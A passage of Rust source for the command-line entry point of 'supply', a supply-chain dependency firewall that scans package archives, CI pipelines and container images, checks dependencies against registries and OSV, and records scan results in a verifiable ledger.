use anyhow::Result;
use clap::{Parser, Subcommand};
use sha2::Digest;
use std::{collections::BTreeSet, net::SocketAddr, path::Path, path::PathBuf};
use supply_core::{
    adapters::{
        azure_devops::{pipeline_annotations, FsAzurePipelineReader},
        config::load_policy,
        github::{workflow_annotations, FsWorkflowReader},
        http::app_with_policy,
        npm::HttpNpmRegistry,
        nuget::{package_version_from_nuget, parse_packages_lock, HttpNuGetRegistry},
        osv::{NoopVulnerabilitySource, OsvVulnerabilitySource, ReqwestOsvTransport},
        pypi::{package_version_from_pypi, parse_requirements, HttpPyPiRegistry},
        storage::MemoryMetadataStore,
    },
    application::{
        AzurePipelinesScanner, DockerScanner, GitHubActionsScanner, PackageEvaluator,
        VersionSelection,
    },
    domain::{Ecosystem, PackageVersionId},
    ports::{ContentScanner, MetadataStore, UpstreamNuGetRegistry, UpstreamPyPiRegistry},
};

#[derive(Parser)]
#[command(
    name = "supply",
    version,
    about = "Local-first supply-chain dependency firewall MVP"
)]
struct Cli {
    #[command(subcommand)]
    command: Command,
    #[arg(long, global = true, env = "SUPPLY_LEDGER_PATH")]
    ledger_db: Option<PathBuf>,
}
#[derive(Subcommand)]
enum Command {
    Serve {
        #[arg(long, default_value = "0.0.0.0:4873")]
        addr: SocketAddr,
        #[arg(
            long,
            env = "SUPPLY_SERVICE_NAME",
            default_value = "supply-core-official"
        )]
        service_name: String,
        #[arg(long, env = "SUPPLY_ARTIFACTS_DIR")]
        artifacts_dir: Option<PathBuf>,
        #[arg(long, env = "SUPPLY_STATUS_FILE")]
        status_file: Option<PathBuf>,
        #[arg(long, env = "SUPPLY_AUTH_TOKEN")]
        auth_token: Option<String>,
        /// Supply Core policy for Docker Hub mirror quarantine and CVEs.
        #[arg(long, env = "SUPPLY_DOCKER_MIRROR_POLICY")]
        policy: Option<PathBuf>,
    },
    PublishDetonation {
        #[arg(long, required = true)]
        pending: bool,
        #[arg(long)]
        public_url: String,
        #[arg(long)]
        ingest_token_file: PathBuf,
        #[arg(long)]
        evidence_dir: PathBuf,
    },
    ScanActions {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        #[arg(long)]
        json: bool,
        /// Emit GitHub Actions workflow error annotations for blocking findings.
        #[arg(long, conflicts_with = "json")]
        annotations: bool,
    },
    #[command(alias = "scan-azure-pipelines")]
    ScanPipelines {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        #[arg(long)]
        json: bool,
        /// Emit Azure DevOps pipeline error logging commands (##vso[task.logissue...]) for blocking findings.
        #[arg(long, conflicts_with = "json")]
        annotations: bool,
    },
    /// Snapshot every dependency of a package.json against the live
    /// registry: latest satisfying version, publish age, policy decision.
    SnapshotNpm {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        /// Query the real OSV.dev API for known vulnerabilities.
        /// Off by default to keep tests deterministic; the daily cron
        /// sets this to populate the field report.
        #[arg(long)]
        osv: bool,
        /// Directory to cache OSV responses in. Defaults to
        /// `$HOME/.local/share/supply-core/osv-cache`.
        #[arg(long)]
        osv_cache: Option<PathBuf>,
        /// JSONL file of content findings to enforce while evaluating.
        #[arg(long)]
        findings: Option<PathBuf>,
    },
    /// Snapshot exact pins from requirements.txt against PyPI: publish
    /// age, sha256, policy decision.
    SnapshotPip {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        /// Query the real OSV.dev API for known vulnerabilities.
        #[arg(long)]
        osv: bool,
        /// Directory to cache OSV responses in. Defaults to
        /// `$HOME/.local/share/supply-core/osv-cache`.
        #[arg(long)]
        osv_cache: Option<PathBuf>,
        /// JSONL file of content findings to enforce while evaluating.
        #[arg(long)]
        findings: Option<PathBuf>,
    },
    /// Snapshot resolved packages from packages.lock.json against
    /// nuget.org: publish age, package hash, policy decision.
    #[command(name = "snapshot-nuget")]
    SnapshotNuGet {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        /// Query the real OSV.dev API for known vulnerabilities.
        #[arg(long)]
        osv: bool,
        /// Directory to cache OSV responses in. Defaults to
        /// `$HOME/.local/share/supply-core/osv-cache`.
        #[arg(long)]
        osv_cache: Option<PathBuf>,
        /// JSONL file of content findings to enforce while evaluating.
        #[arg(long)]
        findings: Option<PathBuf>,
    },
    ScanPackages {
        #[arg(long = "npm-lock")]
        npm_locks: Vec<PathBuf>,
        #[arg(long = "nuget-lock")]
        nuget_locks: Vec<PathBuf>,
        #[arg(long)]
        nuget_packages: Option<PathBuf>,
        #[arg(long, required = true)]
        policy: PathBuf,
        #[arg(long)]
        osv_cache: Option<PathBuf>,
        #[arg(long, required = true)]
        json: bool,
    },
    /// Record content findings for a package archive so later evaluations
    /// can block it.
    ScanPackage {
        ecosystem: String,
        archive: PathBuf,
        #[arg(long)]
        name: String,
        #[arg(long)]
        version: String,
        #[arg(long)]
        policy: Option<PathBuf>,
        #[arg(long, env = "SUPPLY_SCRATCH_DIR")]
        scratch_dir: Option<PathBuf>,
        #[arg(long)]
        external: Option<PathBuf>,
        #[arg(long)]
        findings_out: Option<PathBuf>,
        #[arg(long)]
        json: bool,
    },
    /// Approve one scanner finding for one artifact and engine policy revision.
    ApproveRule {
        #[arg(long)]
        artifact_sha256: String,
        #[arg(long)]
        finding_id: String,
        #[arg(long)]
        policy_sha256: String,
        #[arg(long)]
        expires_at: String,
        #[arg(long)]
        reason: String,
    },
    /// Emit OSV records for stored content findings (dry run by default).
    Report {
        /// JSON file containing an array of content findings.
        findings: PathBuf,
        /// Print the manual submission checklist for public disclosure.
        #[arg(long)]
        submit: bool,
    },
    /// Scan Dockerfiles and compose files for container images that are
    /// not pinned to a sha256 digest.
    ScanDocker {
        #[arg(default_value = ".")]
        root: PathBuf,
        #[arg(long)]
        policy: Option<PathBuf>,
        #[arg(long)]
        json: bool,
    },
    /// Scan a local Docker-save or OCI image archive without starting it.
    ScanImage {
        archive: PathBuf,
        #[arg(long)]
        image_ref: Option<String>,
        #[arg(long, env = "SUPPLY_SCRATCH_DIR")]
        scratch_dir: Option<PathBuf>,
        #[arg(long)]
        require_signature: bool,
        #[arg(long)]
        certificate_identity: Option<String>,
        #[arg(long)]
        certificate_oidc_issuer: Option<String>,
        #[arg(long)]
        policy: Option<PathBuf>,
        #[arg(long)]
        json: bool,
    },
    Ledger {
        #[command(subcommand)]
        command: LedgerCommand,
    },
}
#[derive(Subcommand)]
enum LedgerCommand {
    #[command(about = "Verify stored events, Merkle nodes, and the local root")]
    Verify,
}

struct SystemClock;
impl supply_core::ports::Clock for SystemClock {
    fn now(&self) -> chrono::DateTime<chrono::Utc> {
        chrono::Utc::now()
    }
}
fn ledger_path(path: Option<&Path>) -> Result<PathBuf> {
    match path {
        Some(path) => Ok(path.to_path_buf()),
        None => Ok(std::env::var_os("HOME")
            .map(PathBuf::from)
            .ok_or_else(|| anyhow::anyhow!("HOME is not set; configure --ledger-db"))?
            .join(".local/share/supply-core/ledger.sqlite")),
    }
}
fn open_ledger(path: Option<&Path>) -> Result<supply_core::application::ledger::LedgerRecorder> {
    let path = ledger_path(path)?;
    if let Some(parent) = path
        .parent()
        .filter(|parent| !parent.as_os_str().is_empty())
    {
        std::fs::create_dir_all(parent)?;
    }
    supply_core::application::ledger::LedgerRecorder::open(path)
}
#[cfg(unix)]
fn capture_lock_close_on_exec(fd: i32) -> Result<()> {
    anyhow::ensure!(fd > 2, "invalid capture lock descriptor");
    let flags = unsafe { libc::fcntl(fd, libc::F_GETFD) };
    if flags < 0 {
        return Err(std::io::Error::last_os_error().into());
    }
    if unsafe { libc::fcntl(fd, libc::F_SETFD, flags | libc::FD_CLOEXEC) } < 0 {
        return Err(std::io::Error::last_os_error().into());
    }
    Ok(())
}

#[cfg(unix)]
fn require_local_operator_mode(path: &Path) -> Result<()> {
    use std::os::unix::fs::MetadataExt;

    let effective_uid = unsafe { libc::geteuid() };
    anyhow::ensure!(
        unsafe { libc::getuid() } == effective_uid,
        "rule approvals require matching real and effective user IDs"
    );
    match std::fs::symlink_metadata(path) {
        Ok(metadata) => {
            anyhow::ensure!(
                metadata.file_type().is_file(),
                "rule approval ledger must be a regular file"
            );
            anyhow::ensure!(
                metadata.uid() == effective_uid,
                "rule approval ledger must be owned by the effective user"
            );
        }
        Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
        Err(error) => return Err(error.into()),
    }
    Ok(())
}

#[cfg(not(unix))]
fn require_local_operator_mode(_path: &Path) -> Result<()> {
    anyhow::bail!("rule approvals require Unix same-UID operator mode")
}
#[tokio::main]
async fn main() -> Result<()> {
    let Cli { command, ledger_db } = Cli::parse();
    match command {
        Command::Serve {
            addr,
            service_name,
            artifacts_dir,
            status_file,
            auth_token,
            policy,
        } => {
            let config = supply_core::adapters::http::ServerConfig {
                service_name,
                artifacts_dir,
                status_file,
                auth_token,
                tailnet_domain: supply_core::adapters::http::configured_domain(),
                ..supply_core::adapters::http::ServerConfig::default()
            };
            eprintln!(
                "Starting supply-core server '{}' listening on {}",
                config.service_name, addr
            );
            let listener = tokio::net::TcpListener::bind(addr).await?;
            axum::serve(
                listener,
                app_with_policy(config, load_policy(policy.as_deref())?)?,
            )
            .await?;
        }
        Command::PublishDetonation {
            pending,
            public_url,
            ingest_token_file,
            evidence_dir,
        } => {
            let published = supply_core::adapters::detonation::publisher::publish_pending(
                &public_url,
                &ingest_token_file,
                &evidence_dir,
                pending,
            )
            .await?;
            println!("Accepted {published} detonation bundle(s)");
        }
        Command::ScanActions {
            root,
            policy,
            json,
            annotations,
        } => {
            let p = load_policy(policy.as_deref())?;
            let scanner = GitHubActionsScanner {
                policy: &p,
                reader: &FsWorkflowReader,
            };
            let report = scanner.scan(&root)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else if annotations {
                for annotation in workflow_annotations(&report) {
                    println!("{annotation}");
                }
            } else {
                for f in &report.findings {
                    println!("BLOCK: {}", f.reasons.join("; "));
                }
                println!("scanned {} action references", report.references.len());
            }
            if report.is_blocking() {
                std::process::exit(2);
            }
        }
        Command::ScanPipelines {
            root,
            policy,
            json,
            annotations,
        } => {
            let p = load_policy(policy.as_deref())?;
            let scanner = AzurePipelinesScanner {
                policy: &p,
                reader: &FsAzurePipelineReader,
            };
            let report = scanner.scan(&root)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else if annotations {
                for annotation in pipeline_annotations(&report) {
                    println!("{annotation}");
                }
            } else {
                for f in &report.findings {
                    println!("BLOCK: {}", f.reasons.join("; "));
                }
                println!("scanned {} pipeline references", report.references.len());
            }
            if report.is_blocking() {
                std::process::exit(2);
            }
        }
        Command::SnapshotNpm {
            root,
            policy,
            osv,
            osv_cache,
            findings,
        } => {
            let p = load_policy(policy.as_deref())?;
            let ledger = open_ledger(ledger_db.as_deref())?;
            tokio::task::spawn_blocking(move || {
                snapshot_npm(
                    &root,
                    &p,
                    osv,
                    osv_cache.as_deref(),
                    findings.as_deref(),
                    &ledger,
                )
            })
            .await
            .map_err(|e| anyhow::anyhow!("snapshot task failed: {e}"))??;
        }
        Command::SnapshotPip {
            root,
            policy,
            osv,
            osv_cache,
            findings,
        } => {
            let p = load_policy(policy.as_deref())?;
            let ledger = open_ledger(ledger_db.as_deref())?;
            tokio::task::spawn_blocking(move || {
                snapshot_pip(
                    &root,
                    &p,
                    osv,
                    osv_cache.as_deref(),
                    findings.as_deref(),
                    &ledger,
                )
            })
            .await
            .map_err(|e| anyhow::anyhow!("snapshot task failed: {e}"))??;
        }
        Command::SnapshotNuGet {
            root,
            policy,
            osv,
            osv_cache,
            findings,
        } => {
            let p = load_policy(policy.as_deref())?;
            let ledger = open_ledger(ledger_db.as_deref())?;
            tokio::task::spawn_blocking(move || {
                snapshot_nuget(
                    &root,
                    &p,
                    osv,
                    osv_cache.as_deref(),
                    findings.as_deref(),
                    &ledger,
                )
            })
            .await
            .map_err(|e| anyhow::anyhow!("snapshot task failed: {e}"))??;
        }
        Command::ScanPackages {
            npm_locks,
            nuget_locks,
            nuget_packages,
            policy,
            osv_cache,
            json: _,
        } => {
            let mut policy = load_policy(Some(&policy))?;
            policy.npm.fallback_to_frozen = false;
            policy.nuget.fallback_to_frozen = false;
            let (report, status) = tokio::task::spawn_blocking(move || {
                supply_core::application::packages::scan(
                    &npm_locks,
                    &nuget_locks,
                    nuget_packages.as_deref(),
                    &policy,
                    osv_cache.as_deref(),
                )
            })
            .await
            .map_err(|error| anyhow::anyhow!("package scan task failed: {error}"))??;
            println!("{}", serde_json::to_string_pretty(&report)?);
            eprintln!(
                "scan-packages: inputs={} packages={} errors={} flagged={} complete={}",
                report.inputs.len(),
                report.packages.len(),
                report.errors.len(),
                report
                    .packages
                    .iter()
                    .filter(|package| {
                        (package.status != "allow" && package.status != "not-applicable")
                            || !package.warnings.is_empty()
                    })
                    .count(),
                report.complete
            );
            if status != 0 {
                std::process::exit(status);
            }
        }
        Command::ScanDocker { root, policy, json } => {
            let p = load_policy(policy.as_deref())?;
            let report = DockerScanner { policy: &p }.scan(&root)?;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                for finding in &report.findings {
                    println!("BLOCK: {}", finding.reasons.join("; "));
                }
                println!("scanned {} image references", report.references.len());
            }
            if report.is_blocking() {
                std::process::exit(2);
            }
        }
        Command::ScanImage {
            archive,
            image_ref,
            scratch_dir,
            require_signature,
            certificate_identity,
            certificate_oidc_issuer,
            policy,
            json,
        } => {
            let policy = load_policy(policy.as_deref())?;
            let report = tokio::task::spawn_blocking(move || {
                supply_core::application::image_scanner::scan_image(
                    &archive,
                    &policy,
                    supply_core::application::image_scanner::ImageScanOptions {
                        scratch_dir: scratch_dir.as_deref(),
                        image_ref: image_ref.as_deref(),
                        require_signature,
                        certificate_identity: certificate_identity.as_deref(),
                        certificate_oidc_issuer: certificate_oidc_issuer.as_deref(),
                    },
                )
            })
            .await
            .map_err(|error| anyhow::anyhow!("image scan task failed: {error}"))??;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                println!(
                    "decision={:?} coverage={:?} signature={:?}",
                    report.report.decision, report.report.coverage, report.signature_status
                );
                for engine in &report.report.engines {
                    println!(
                        "{}: {:?}, {} finding(s)",
                        engine.source,
                        engine.coverage,
                        engine.findings.len()
                    );
                    for finding in &engine.findings {
                        println!("  {}: {}", finding.rule, finding.summary);
                    }
                }
            }
            match report.report.decision {
                supply_core::application::ledger::ScanDecision::Block => {
                    std::process::exit(2);
                }
                supply_core::application::ledger::ScanDecision::Incomplete => {
                    std::process::exit(3);
                }
                supply_core::application::ledger::ScanDecision::Pass
                | supply_core::application::ledger::ScanDecision::Review => {}
            }
        }
        Command::ScanPackage {
            ecosystem,
            archive,
            name,
            version,
            policy,
            scratch_dir,
            external,
            findings_out,
            json,
        } => {
            #[cfg(unix)]
            if let Some(fd) = std::env::var_os("SUPPLY_DAILY_CAPTURE_LOCK_FD") {
                let fd = fd
                    .to_str()
                    .and_then(|value| value.parse::<i32>().ok())
                    .ok_or_else(|| anyhow::anyhow!("invalid capture lock descriptor"))?;
                capture_lock_close_on_exec(fd)?;
            }
            let ledger = open_ledger(ledger_db.as_deref())?;
            let policy = load_policy(policy.as_deref())?;
            let report = tokio::task::spawn_blocking(move || {
                scan_package(
                    &ecosystem,
                    &archive,
                    &name,
                    &version,
                    ScanPackageOptions {
                        external: external.as_deref(),
                        scratch_dir: scratch_dir.as_deref(),
                        findings_out: findings_out.as_deref(),
                        policy: &policy,
                        ledger: &ledger,
                    },
                )
            })
            .await
            .map_err(|error| anyhow::anyhow!("scan task failed: {error}"))??;
            if json {
                println!("{}", serde_json::to_string_pretty(&report)?);
            } else {
                println!(
                    "decision={} coverage={}",
                    serde_json::to_value(report.decision)?,
                    serde_json::to_value(report.coverage)?
                );
                for engine in &report.engines {
                    println!(
                        "{}: {:?}, {} finding(s)",
                        engine.source,
                        engine.coverage,
                        engine.findings.len()
                    );
                    for finding in &engine.findings {
                        println!("  {}: {}", finding.rule, finding.summary);
                    }
                }
            }
            match report.decision {
                supply_core::application::ledger::ScanDecision::Block => {
                    std::process::exit(2);
                }
                supply_core::application::ledger::ScanDecision::Incomplete => {
                    std::process::exit(3);
                }
                supply_core::application::ledger::ScanDecision::Pass
                | supply_core::application::ledger::ScanDecision::Review => {}
            }
        }
        Command::Report { findings, submit } => {
            let content = std::fs::read_to_string(&findings)?;
            let stored = supply_core::adapters::storage::parse_findings(&content)?;
            let records: Vec<serde_json::Value> =
                stored.iter().map(|finding| finding.to_osv()).collect();
            println!("{}", serde_json::to_string_pretty(&records)?);
            if submit {
                eprintln!("Public disclosure remains a manual, reviewed step:");
                eprintln!("  1. malicious npm package: use 'Report malware' on the package page");
                eprintln!(
                    "  2. malicious PyPI project: use 'Report project as malware' (cite inspector.pypi.io lines)"
                );
                eprintln!("  3. open a PR against ossf/malicious-packages with these OSV records");
                eprintln!(
                    "  4. non-malicious vulnerability: maintainers privately, then GitHub Advisory Database"
                );
            }
        }
        Command::ApproveRule {
            artifact_sha256,
            finding_id,
            policy_sha256,
            expires_at,
            reason,
        } => {
            let expires_at =
                chrono::DateTime::parse_from_rfc3339(&expires_at)?.with_timezone(&chrono::Utc);
            anyhow::ensure!(
                expires_at > chrono::Utc::now(),
                "approval expiry must be in the future"
            );
            let path = ledger_path(ledger_db.as_deref())?;
            require_local_operator_mode(&path)?;
            let ledger = open_ledger(Some(&path))?;
            require_local_operator_mode(&path)?;
            let position = ledger.record_rule_approval(
                &artifact_sha256,
                &finding_id,
                &policy_sha256,
                expires_at,
                &reason,
            )?;
            println!("rule_approval_event_position={position}");
        }
        Command::Ledger {
            command: LedgerCommand::Verify,
        } => {
            let path = ledger_path(ledger_db.as_deref())?;
            let head = supply_core::application::ledger::verify_ledger_integrity(path)?;
            println!(
                "integrity=valid tree_size={} root={}",
                head.tree_size,
                hex::encode(head.root)
            );
        }
    }
    Ok(())
}

fn content_finding_from_engine_report(
    ecosystem: &Ecosystem,
    name: &str,
    version: &PackageVersionId,
    report: &supply_core::application::ledger::EngineReport,
) -> Option<supply_core::domain::ContentFinding> {
    if report.findings.is_empty() {
        return None;
    }
    let mut rules = Vec::new();
    for finding in &report.findings {
        if !rules.contains(&finding.rule) {
            rules.push(finding.rule.clone());
        }
    }
    let score = report
        .findings
        .iter()
        .filter_map(|finding| finding.policy_score)
        .max();
    Some(supply_core::domain::ContentFinding {
        ecosystem: ecosystem.clone(),
        package: name.to_string(),
        version: version.clone(),
        source: report.source.clone(),
        score,
        scan_incomplete: report.coverage != supply_core::application::ledger::Coverage::Complete
            || score.is_none(),
        rules,
        summary: "external scanner reported a finding".to_string(),
        detected_at: chrono::Utc::now(),
    })
}

fn explicit_hard_block(
    engine: &supply_core::application::ledger::EngineReport,
    finding: &supply_core::application::ledger::EngineFinding,
) -> bool {
    match engine.source.as_str() {
        "yarahunter" => true,
        "modelscan" | "mcp-safeguard" => {
            finding.native_severity.as_deref().is_some_and(|severity| {
                severity.eq_ignore_ascii_case("high") || severity.eq_ignore_ascii_case("critical")
            })
        }
        "static-heuristics" => matches!(
            finding.rule.as_str(),
            "nuget-init-ps1" | "nuget-inline-using-task"
        ),
        _ => false,
    }
}

fn artifact_report_from_event(
    event: &supply_core::application::ledger::LedgerEvent,
    policy: &supply_core::domain::Policy,
    approved_finding_ids: &BTreeSet<String>,
) -> Result<supply_core::application::ledger::ArtifactReport> {
    use supply_core::application::ledger::{
        scan_cache_key_sha256, ArtifactReport, Coverage, LedgerEventDetails, ScanDecision,
    };

    let (evidence, failure) = match &event.body.details {
        LedgerEventDetails::ScanCompleted(body) => (&body.evidence, None),
        LedgerEventDetails::ScanFailed(body) => (&body.evidence, Some(body.failure_code.clone())),
        _ => anyhow::bail!("ledger event is not a package scan"),
    };
    let engines = evidence.engine_reports.clone();
    let missing_score = engines
        .iter()
        .flat_map(|engine| &engine.findings)
        .any(|finding| finding.policy_score.is_none());
    let mut coverage = evidence.coverage.unwrap_or(Coverage::Unknown);
    if missing_score && coverage == Coverage::Complete {
        coverage = Coverage::Partial;
    }
    let score = engines
        .iter()
        .flat_map(|engine| &engine.findings)
        .filter(|finding| !approved_finding_ids.contains(&finding.id))
        .filter_map(|finding| finding.policy_score)
        .max();
    let explicit_block = engines.iter().any(|engine| {
        engine.findings.iter().any(|finding| {
            !approved_finding_ids.contains(&finding.id) && explicit_hard_block(engine, finding)
        })
    });
    let decision = if explicit_block
        || score.is_some_and(|score| score >= policy.quarantine_scanner.block_score.into())
    {
        ScanDecision::Block
    } else if coverage != Coverage::Complete {
        ScanDecision::Incomplete
    } else if score.is_some_and(|score| score >= policy.quarantine_scanner.review_score.into()) {
        ScanDecision::Review
    } else {
        ScanDecision::Pass
    };
    let reason = if coverage == Coverage::Complete {
        None
    } else {
        failure
            .or_else(|| engines.iter().find_map(|engine| engine.reason.clone()))
            .or_else(|| missing_score.then(|| "policy_score_missing".to_string()))
            .or_else(|| Some("incomplete_coverage".to_string()))
    };
    let policy_sha256 = hex::encode(sha2::Sha256::digest(serde_json::to_vec(policy)?));
    let engine_policy_revision_sha256 = event.body.identity.engine_policy_revision.clone();
    let cache_key_sha256 = match (
        evidence.artifact_sha256.as_deref(),
        engine_policy_revision_sha256.as_deref(),
    ) {
        (Some(artifact), Some(revision)) => {
            Some(scan_cache_key_sha256(artifact, &policy_sha256, revision)?)
        }
        _ => None,
    };
    let report = ArtifactReport {
        artifact_sha256: evidence.artifact_sha256.clone(),
        policy_sha256: Some(policy_sha256),
        engine_policy_revision_sha256,
        cache_key_sha256,
        coverage,
        decision,
        engines,
        reason,
    };
    report.validate()?;
    Ok(report)
}
fn failed_scanner_report(
    source: &str,
    input_sha256: Option<&str>,
    reason: &str,
) -> supply_core::application::ledger::EngineReport {
    supply_core::application::ledger::EngineReport {
        source: source.to_string(),
        version: None,
        rule_bundle_sha256: None,
        database_sha256: None,
        input_sha256: input_sha256.map(str::to_string),
        expected_inputs: 1,
        processed_inputs: 0,
        coverage: supply_core::application::ledger::Coverage::Unknown,
        findings: Vec::new(),
        reason: Some(reason.to_string()),
    }
}
struct ExternalScannerContext<'a> {
    ecosystem: &'a Ecosystem,
    archive_path: &'a Path,
    name: &'a str,
    version: &'a PackageVersionId,
    artifact_sha256: &'a str,
    large_scan: bool,
}

fn external_scanner_report(
    scanner: &supply_core::adapters::command_scanner::CommandScanner,
    archive: &mut std::fs::File,
    context: ExternalScannerContext<'_>,
) -> supply_core::application::ledger::EngineReport {
    let ExternalScannerContext {
        ecosystem,
        archive_path,
        name,
        version,
        artifact_sha256,
        large_scan,
    } = context;
    if large_scan {
        return failed_scanner_report(
            &scanner.source,
            Some(artifact_sha256),
            "scanner_scratch_quota_unavailable",
        );
    }
    scanner
        .scan_archive(ecosystem, archive, archive_path, name, version)
        .unwrap_or_else(|_| {
            failed_scanner_report(
                &scanner.source,
                Some(artifact_sha256),
                "scanner_execution_failed",
            )
        })
}

struct ScanPackageOptions<'a> {
    external: Option<&'a Path>,
    scratch_dir: Option<&'a Path>,
    findings_out: Option<&'a Path>,
    policy: &'a supply_core::domain::Policy,
    ledger: &'a supply_core::application::ledger::LedgerRecorder,
}
fn scan_package(
    ecosystem: &str,
    archive: &Path,
    name: &str,
    version: &str,
    options: ScanPackageOptions<'_>,
) -> Result<supply_core::application::ledger::ArtifactReport> {
    let ScanPackageOptions {
        external,
        scratch_dir,
        findings_out,
        policy,
        ledger,
    } = options;
    let ecosystem = match ecosystem {
        "npm" => Ecosystem::Npm,
        "pypi" | "pip" => Ecosystem::PyPi,
        "nuget" => Ecosystem::NuGet,
        other => anyhow::bail!("unsupported ecosystem: {other}"),
    };
    let parsed = PackageVersionId::parse(&ecosystem, version)?;
    let event_position = ledger.verify_integrity()?.tree_size;
    let mut all_findings = Vec::new();

    let store = MemoryMetadataStore::default();
    let mut external_scanners = Vec::new();
    if matches!(ecosystem, Ecosystem::Npm | Ecosystem::PyPi) {
        let command = std::env::var("GUARDDOG_BIN").unwrap_or_else(|_| "guarddog".to_string());
        let guarddog = supply_core::adapters::command_scanner::CommandScanner::guarddog(command)
            .with_limits(std::time::Duration::from_secs(180), 8 * 1024 * 1024);
        external_scanners.push(match std::env::var_os("GUARDDOG_MANIFEST") {
            Some(manifest) => guarddog.with_guarddog_manifest(Path::new(&manifest)),
            None => guarddog,
        });
    }
    if let Some(command) = external {
        external_scanners.push(supply_core::adapters::command_scanner::CommandScanner::new(
            command,
            "external-scan",
        ));
    }

    let staged_archive = scratch_dir.and_then(|scratch| {
        supply_core::application::scanner::stage_archive_path(archive, scratch).ok()
    });
    if let (Some(scratch), Some(staged_archive)) = (scratch_dir, staged_archive.as_ref()) {
        let _ = supply_core::application::scanner::scan_staged_archive_with_completion(
            &store,
            ledger,
            supply_core::application::scanner::ScanPackage::new(&ecosystem, name, &parsed),
            staged_archive,
            scratch,
            |inventory, static_finding, scanner_findings, engine_reports| {
                if let Some(finding) = static_finding {
                    all_findings.push(finding.clone());
                }
                for scanner in &external_scanners {
                    let report = match staged_archive.clone_reader() {
                        Ok(mut archive) => external_scanner_report(
                            scanner,
                            &mut archive,
                            ExternalScannerContext {
                                ecosystem: &ecosystem,
                                archive_path: staged_archive.path(),
                                name,
                                version: &parsed,
                                artifact_sha256: staged_archive.sha256(),
                                large_scan: staged_archive.is_large_scan(),
                            },
                        ),
                        Err(_) => failed_scanner_report(
                            &scanner.source,
                            Some(staged_archive.sha256()),
                            "scanner_input_unavailable",
                        ),
                    };
                    if let Some(finding) =
                        content_finding_from_engine_report(&ecosystem, name, &parsed, &report)
                    {
                        scanner_findings.push(finding.clone());
                        store.save_content_finding(&finding)?;
                        all_findings.push(finding);
                    }
                    engine_reports.push(report);
                }
                let expected_paths = inventory
                    .members
                    .iter()
                    .filter(|member| {
                        member.member_type
                            != supply_core::application::scanner::ArchiveMemberType::Directory
                    })
                    .map(|member| member.normalized_path.clone())
                    .collect::<std::collections::BTreeSet<_>>();
                let expected_inputs = u64::try_from(expected_paths.len())?;
                let ossgadget_report = if staged_archive.is_large_scan() {
                    supply_core::adapters::command_scanner::OssGadgetScanner::unavailable_report(
                        staged_archive.sha256(),
                        expected_inputs,
                        "scanner_scratch_quota_unavailable",
                    )
                } else if std::env::var_os("OSSGADGET_BIN").is_none() {
                    supply_core::adapters::command_scanner::OssGadgetScanner::unavailable_report(
                        staged_archive.sha256(),
                        expected_inputs,
                        "scanner_not_configured",
                    )
                } else {
                    match supply_core::adapters::command_scanner::OssGadgetScanner::from_env() {
                        Ok(scanner) => scanner
                            .scan(
                                inventory.scanner_root(),
                                &expected_paths,
                                inventory.complete,
                                staged_archive.sha256(),
                            )
                            .unwrap_or_else(|_| {
                                supply_core::adapters::command_scanner::OssGadgetScanner::unavailable_report(
                                    staged_archive.sha256(),
                                    expected_inputs,
                                    "scanner_execution_failed",
                                )
                            }),
                        Err(_) => {
                            supply_core::adapters::command_scanner::OssGadgetScanner::unavailable_report(
                                staged_archive.sha256(),
                                expected_inputs,
                                "scanner_integrity_check_failed",
                            )
                        }
                    }
                };
                if let Some(finding) =
                    content_finding_from_engine_report(&ecosystem, name, &parsed, &ossgadget_report)
                {
                    scanner_findings.push(finding.clone());
                    store.save_content_finding(&finding)?;
                    all_findings.push(finding);
                }
                engine_reports.push(ossgadget_report);
                Ok(())
            },
        );
    }

    if ledger.events_from(event_position, 1)?.is_empty() {
        supply_core::application::scanner::record_scan_failed(
            ledger,
            &ecosystem,
            name,
            &parsed,
            staged_archive.as_ref().map(|staged| staged.sha256()),
        )?;
    }
    if let Some(path) = findings_out {
        let file = supply_core::adapters::storage::FindingFile::new(path);
        for finding in &all_findings {
            file.append(finding)?;
        }
    }
    let event = ledger
        .events_from(event_position, 1)?
        .into_iter()
        .next()
        .ok_or_else(|| anyhow::anyhow!("scan event was not recorded"))?;
    let approved_finding_ids = match (
        event
            .body
            .identity
            .artifact_identity
            .as_deref()
            .and_then(|identity| identity.strip_prefix("sha256:")),
        event.body.identity.engine_policy_revision.as_deref(),
    ) {
        (Some(artifact_sha256), Some(policy_sha256)) => {
            ledger.active_rule_approvals(artifact_sha256, policy_sha256, chrono::Utc::now())?
        }
        _ => BTreeSet::new(),
    };
    artifact_report_from_event(&event, policy, &approved_finding_ids)
}

fn snapshot_npm(
    root: &std::path::Path,
    policy: &supply_core::domain::Policy,
    use_osv: bool,
    osv_cache: Option<&std::path::Path>,
    findings: Option<&std::path::Path>,
    ledger: &supply_core::application::ledger::LedgerRecorder,
) -> Result<()> {
    use supply_core::adapters::npm::package_version_from_metadata;
    use supply_core::domain::PackageVersion;
    use supply_core::ports::UpstreamNpmRegistry;

    let manifest = std::fs::read_to_string(root.join("package.json"))?;
    let deps: Vec<(String, String)> = serde_json::from_str::<serde_json::Value>(&manifest)?
        .get("dependencies")
        .and_then(|d| d.as_object())
        .map(|o| {
            o.iter()
                .filter(|(_, v)| v.is_string())
                .map(|(k, v)| (k.clone(), v.as_str().unwrap_or("").to_string()))
                .collect()
        })
        .unwrap_or_default();

    let registry = HttpNpmRegistry::new()?;
    let store = MemoryMetadataStore::default();
    if let Some(path) = findings {
        supply_core::adapters::storage::FindingFile::new(path).load_into(&store)?;
    }
    let now = chrono::Utc::now();
    let mut entries = vec![];
    let mut errors = vec![];

    for (name, range) in &deps {
        let req = node_semver::Range::parse(range);
        let Ok(req) = req else {
            errors.push(
                serde_json::json!({"package": name, "error": format!("unparseable range {range}")}),
            );
            continue;
        };
        let meta = match registry.metadata(name) {
            Ok(m) => m,
            Err(e) => {
                errors.push(serde_json::json!({"package": name, "error": e.to_string()}));
                continue;
